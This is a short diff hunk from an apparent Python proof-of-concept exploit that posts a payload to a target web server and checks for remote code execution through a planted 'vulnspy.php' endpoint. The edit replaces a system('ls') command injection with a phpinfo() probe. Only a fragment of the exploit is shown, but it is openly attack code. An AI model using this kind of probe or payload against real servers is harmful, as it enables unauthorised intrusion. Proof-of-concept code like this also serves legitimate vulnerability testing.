@@ -34,7 +34,7 @@ def poc(url):
         resp = requests.post(url1, data=payload, headers=headers, timeout=5)  # attack
 
         # Step 2 : Check whether can execute command on target
-        url2 = 'http://' + url + '/vulnspy.php?vulnspy=system('ls');'
+        url2 = 'http://' + url + '/vulnspy.php?vulnspy=phpinfo();'
         # print url2, check this url by your hand
         resp = requests.get(url2, timeout=5)
 
